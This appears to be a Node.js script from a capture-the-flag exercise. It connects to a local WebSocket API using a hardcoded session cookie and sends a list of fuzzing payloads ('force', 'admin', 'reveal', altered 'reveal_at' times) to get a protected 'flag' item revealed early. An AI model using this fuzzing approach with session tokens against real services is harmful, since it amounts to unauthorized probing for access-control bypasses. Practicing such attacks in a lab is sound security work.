const WebSocket = require('ws');

const sessionToken = 'a281cecb-6882-408d-bf65-51178b88da3a';
const targetId = '13371337-1337-1337-1337-133713371337'; // flag ID

const ws = new WebSocket('ws://localhost:3000/api/ws', {
  headers: {
    Cookie: `session=${sessionToken}`,
  },
});

const fuzzPayloads = [
  { command: "open", id: targetId },
  { command: "open", id: targetId, reveal_at: 0 },
  { command: "open", id: targetId, reveal_at: Date.now() - 10000 },
  { command: "update", id: targetId, reveal_at: 0 },
  { command: "force", id: targetId },
  { command: "debug", id: targetId },
  { command: "admin", id: targetId },
  { command: "reveal", id: targetId },
];

ws.on('open', () => {
  console.log("Connected to WebSocket, sending payloads...\n");

  fuzzPayloads.forEach((payload, i) => {
    setTimeout(() => {
      console.log(`>>> Sending:`, payload);
      ws.send(JSON.stringify(payload));
    }, i * 50); // small delay between each
  });
});

ws.on('message', (msg) => {
  console.log(`<<< Response: ${msg.toString()}`);
});

ws.on('error', (err) => {
  console.error("âŒ WebSocket error:", err.message);
});

ws.on('close', () => {
  console.log("WebSocket closed.");
});

